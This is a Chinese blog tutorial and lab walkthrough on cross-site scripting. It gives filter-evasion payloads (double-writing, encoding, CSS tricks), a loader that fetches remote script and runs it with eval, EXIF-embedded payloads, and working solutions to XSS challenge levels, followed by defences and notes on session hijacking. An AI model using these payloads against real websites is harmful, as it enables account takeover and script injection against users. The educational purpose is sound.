<h2 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt; 	一次过滤的双写绕过</span><br></pre></td></tr></table></figure>

<h2 id="编码脚本代码绕过关键字过滤"><a href="#编码脚本代码绕过关键字过滤" class="headerlink" title="编码脚本代码绕过关键字过滤"></a>编码脚本代码绕过关键字过滤</h2><p>有时服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行。还有许多其它编码（URL，Base64,HTML等）可以尝试。<br>例如alert(1)使用unicode编码过后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(\u0061\u006c\u0065\u0072\u0074(1))</span><br></pre></td></tr></table></figure>

<h2 id="CSS中的变形"><a href="#CSS中的变形" class="headerlink" title="CSS中的变形"></a>CSS中的变形</h2><ul>
<li>使用全角字符<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">width</span>:e x p r e s s i o <span class="built_in">n</span>(<span class="built_in">alert</span>(/xss/))</span><br></pre></td></tr></table></figure></li>
<li>注释会被浏览器忽略<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">width</span>:expr<span class="comment">/*~*/</span><span class="built_in">ession</span>(<span class="built_in">alert</span>(/x~s~s/))</span><br></pre></td></tr></table></figure></li>
<li>样式表中的 <code>\</code> 和 <code>\0</code><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;<span class="keyword">@import</span> <span class="string">&#x27;javasc\ri\0pt:alert(&quot;xss&quot;)&#x27;</span>;&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Shellcode-的调用"><a href="#Shellcode-的调用" class="headerlink" title="Shellcode 的调用"></a>Shellcode 的调用</h1><p>shellcode就是在利用漏洞所执行的代码<br>完整的XSS攻击，会将shellcode存放在一定的地方，然后触发漏洞，调用shellcode</p>
<h2 id="远程调用JS"><a href="#远程调用JS" class="headerlink" title="远程调用JS"></a>远程调用JS</h2><p>可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.132.138/XSS-TEST/normal/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是比较常用的方式。xss.js的内容如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="windows-location-hash"><a href="#windows-location-hash" class="headerlink" title="windows.location.hash"></a>windows.location.hash</h2><p>可以使用js中的windows.location.hash 方法获取浏览器URL地址栏的XSS代码。类似于DOM型XSS，不容易被WAF检测到。<br>windows.location.hash会获取URL中的 <code>#</code> 后面的内容，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://domain.com/index.php#AJEST    windows.location.hash的值就是#AJEST</span><br></pre></td></tr></table></figure>
<p>所以可以构造如下代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?submit=submit&amp;xsscode=&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(/This is windows.location.hash/)</span><br></pre></td></tr></table></figure>
<p>直接提交到测试页面xss.php</p>
<h2 id="XSS-Downloader"><a href="#XSS-Downloader" class="headerlink" title="XSS Downloader"></a>XSS Downloader</h2><h3 id="XSS下载器"><a href="#XSS下载器" class="headerlink" title="XSS下载器"></a>XSS下载器</h3><p>XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。<br>在使用XSS Downloader之前我们需要准备一个自己的页面，xss_downloader.php，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~~~BOF|alert(/xss/)|EOF~~~~ 		其中~表示前后的代码，BOF和EOF是作为定位使用，中间放置XSS代码</span><br></pre></td></tr></table></figure>
<p>常见的下载器如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">XSS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://172.16.132.138/XSS-TEST/normal/xss_downloader.php&#x27;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">	b=a.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.<span class="title function_">substring</span>(b.<span class="title function_">indexOf</span>(<span class="string">&#x27;BOF|&#x27;</span>)+<span class="number">4</span>,b.<span class="title function_">indexOf</span>(<span class="string">&#x27;EOF|&#x27;</span>))));</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">XSS</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="AJAX-技术的同源策略限制"><a href="#AJAX-技术的同源策略限制" class="headerlink" title="AJAX 技术的同源策略限制"></a>AJAX 技术的同源策略限制</h3><p>AJAX 技术会受到浏览器同源策略的限制，为了解决这个问题，我们需要在服务器端代码中添加如下内容：<br>在XSS Downloader前加上</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers:Origin, X-Requested-With, Content-Type, Accept&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可实现跨域访问</p>
<h2 id="备选存储技术"><a href="#备选存储技术" class="headerlink" title="备选存储技术"></a>备选存储技术</h2><p>可以把Shellcode存储存储在客户端的本地域中，比如HTTP Cookie，Flash共享对象，UserData，localStorage等。这里以HTTP Cookie为例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;.xss.php&#x27; target=&#x27;_blank&#x27;&gt;Cookie -XSS 验证&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;设置Cookie失败&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击Cookie-XSS验证，即可产生弹窗</p>
<h1 id="靶场训练"><a href="#靶场训练" class="headerlink" title="靶场训练"></a>靶场训练</h1><p>这里使用的是该靶场<a target="_blank" rel="noopener" href="http://test.ctf8.com/">XSS Challenges</a><br>简单过一遍~</p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在url处输入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>按level 1 的方法无法成功，于是观察源代码。发现需要闭合标签。我们需要自己构造：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>尝试使用上一关的注入手法，发现左右尖括号被过滤，于是我们选择不需要尖括号的方式，使用事件闭合单引号：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和上一关原理相同，只不过换成了双引号：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>本关用下划线把on和script分开：o_n, scr_ipt<br>所以我们需要更换标签，使用a标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(/xss/)XSS</span>&lt;/<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>本关也用下划线把href分开：hr_ef<br>我们尝试大小写绕过，发现成功：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>本关输入后，发现href和script都消失了，因此我们判断是进行了一次过滤，那么方案即为双写绕过：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrhrefef</span>=<span class="string">&quot;javascrscriptipt:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>本关是添加一个链接，通过源代码可知是将代码写到href里，但写入javascript:alert(&#x2F;xss&#x2F;)后发现script变成了scr ipt，<br>于是我们尝试在script之间加一个TAB键，用编码后的格式插入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>无论如何注入，点开源代码，发现都显示链接不合法，那么我们思考是不是检测了http:&#x2F;&#x2F; 于是尝试构造含有http:&#x2F;&#x2F; 的XSS代码，发现成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这一关查看源代码，发现正常显示位置keyword进行了严格过滤，但我们发现源代码中有三个type为hidden的隐藏参数，注入尝试，发现只有t_sort是有效的，因此我们通过t_sort注入XSS代码，把type改为text等能够显示的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关源代码中出现了这样的语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;http://test.ctf8.com/level10.php?keyword=1&amp;t_sort=%22%20type=%22text%22%20onmouseover=%22alert(/xss/)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>t_ref这个值就是http请求中的referer，所以抓包改包<br>如果没有Referer，直接自己添加一个，输入以下值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>只不过是变成了user-agent，XSS注入手法一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>只不过是变成了cookie，XSS注入手法一样，按下F12，点击存储-&gt;Cookie-&gt;user，将值改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>exif 题目失效,图片加载不出来<br>漏洞成因：chrome插件exif viewer获取图片exif信息时没有进行过滤，导致xss代码执行。<br>exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，具体实现使用kali下的exiftool工具，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exiftool -FIELD=XSS FILE</span><br><span class="line">exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; brute.jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于网址失效，从14关之后都无法做了，后面的通关方法可以看看这个博客：<br><a target="_blank" rel="noopener" href="http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/">XSS挑战之旅</a></p>
<h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>XSS Filter 的作用是过滤用户(客户端)提交的有害信息，从而达到防范XSS攻击的效果</p>
<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>“永远不要相信用户的输入”是网站开发的基本常识，对于用户输入一定要严格过滤。</p>
<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>简单的说，输入验证就是对用户提交的信息进行有效验证，仅接收指定长度范围内的数据，采用适当格式的内容提交，阻止或忽略除此之外的任何其它数据。</p>
<ul>
<li>输入是否仅包含合法字符</li>
<li>输入字符串是否超过最大长度限制</li>
<li>输入如果含有数字，数字是否在指定范围内</li>
<li>输入是否符合特殊格式要求，如E-mail地址，IP地址等</li>
</ul>
<h3 id="数据消毒"><a href="#数据消毒" class="headerlink" title="数据消毒"></a>数据消毒</h3><p>过滤和净化掉有害输入</p>
<h3 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h3><p>HTML编码主要是用对应的HTML实体代替字符，比如<code>&lt; &gt; &quot; &#39;</code></p>
<h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>不管用输入过滤还是输出编码，都针对数据信息进行黑|白名单式的过滤</p>
<ul>
<li>黑名单：非允许数据</li>
<li>白名单：允许的数据</li>
</ul>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><p>避免客户端文档重写，重定向或其它敏感操作。</p>
<h1 id="XSS工具"><a href="#XSS工具" class="headerlink" title="XSS工具"></a>XSS工具</h1><h2 id="beEF"><a href="#beEF" class="headerlink" title="beEF"></a>beEF</h2><p>XSS 漏洞利用平台<br>启动在kali中<br>工具目录 <code>/usr/share/beef-xss</code><br>配置文件 <code>config.yaml</code><br>修改默认用户名和密码</p>
<h1 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h1><h2 id="浏览器劫持"><a href="#浏览器劫持" class="headerlink" title="浏览器劫持"></a>浏览器劫持</h2><ul>
<li>从软件方面来说，它是一种恶意程序，通过DLL插件、BHO、WinsockLSP等形式对用户的浏览器进行篡改，使用户浏览器出现访问正常网站时被转向到恶意网页、IE浏览器主页&#x2F;搜索页等被修改为劫持软件指定的网站地址等异常情况。</li>
<li>从技术方面来说，它是一种常见的在线攻击类型，黑客可通过这种方式控制的计算机的浏览器，并更改网上冲浪的方式和冲浪时所显示的内容。</li>
<li>“浏览器劫持”，通俗点说就是故意误导浏览器行进路线的一种现象。</li>
</ul>
<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p>
<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><ol>
<li>目标用户需要先登录站点；</li>
<li>登录成功后，该用户会得到站点提供的一个会话标识SessionID；</li>
<li>攻击者通过某种攻击手段捕获Session ID；攻击者获取SessionID的方式有多种：</li>
</ol>
<ul>
<li>暴力破解：尝试各种Session ID，直到破解为止；</li>
<li>预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；</li>
<li>窃取：使用网络嗅探，XSS攻击等方法获得。</li>
</ul>
<ol start="4">
<li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
<li>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</li>
<li>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</li>
<li>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</li>
<li>关闭所有phpinfo类dump request信息的页面。</li>
<li>验证HTTP头部信息。</li>
<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
</ul>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>利用漏洞获取一定的服务器权限就是getshell，如果是web漏洞就叫webshell，还有别的shell，ftp、sql、3899、4899等等，一般来说这个shell权限很低，需要提权后才能获取服务器的管理员权限。<br>ms10002漏洞可以通过winxp的IE浏览器GetShell；</p>
<p>详细内容参考该文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64378913/article/details/124752200">XSS漏洞利用案例</a></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/463346634#:~:text=%E4%BB%8E0%E5%88%B01%E5%AD%A6%E4%B9%A0XSS%EF%BC%88%E6%9C%80%E5%85%A8%E6%9C%80%E7%BB%86%E8%87%B4%E7%9A%84%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%EF%BC%89%201%201%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B%20%28%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96%29%20%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E5%8F%88%E7%A7%B0%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8Bxss%EF%BC%8C%E6%98%AF%E7%9B%AE%E5%89%8D%E6%9C%80%E6%99%AE%E9%81%8D%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%BE%80%E5%BE%80%E5%85%B7%E6%9C%89%E4%B8%80%E6%AC%A1%E6%80%A7%E3%80%82%20%E5%8F%91%E5%87%BA%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E5%87%BA%E7%8E%B0%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%8F%90%E4%BA%A4%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E5%93%8D%E5%BA%94%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E9%9A%8F%E5%93%8D%E5%BA%94%E5%86%85%E5%AE%B9%E4%B8%80%E8%B5%B7%E4%BC%A0%E5%9B%9E%E7%BB%99%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E6%9C%80%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8CXSS%E4%BB%A3%E7%A0%81%E3%80%82%20...,1%E3%80%8B%204%203%E3%80%81%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%9B%E9%94%8B%E7%9C%9F%E4%BA%BACS%E9%87%8E%E6%88%98123%20%EF%BC%881%EF%BC%89%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD%20%E9%93%BE%E6%8E%A5%EF%BC%9A%20pan.baidu.com%2Fs%2F1YUKC5I%20%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Artra%20">从0到1学习XSS</a></p>

    </div>

    
    
    
        <div class="reward-container">
  <div>我很可爱，请给我钱</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Bron
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2022/12/02/XSS/" title="XSS跨站脚本漏洞">http://example.com/2022/12/02/XSS/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>欢迎关注我的其它发布渠道</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/12/01/Diary_1201/" rel="prev" title="年末月初">
      <i class="fa fa-chevron-left"></i> 年末月初
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/12/06/CSRF/" rel="next" title="CSRF跨站请求伪造">
      CSRF跨站请求伪造 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
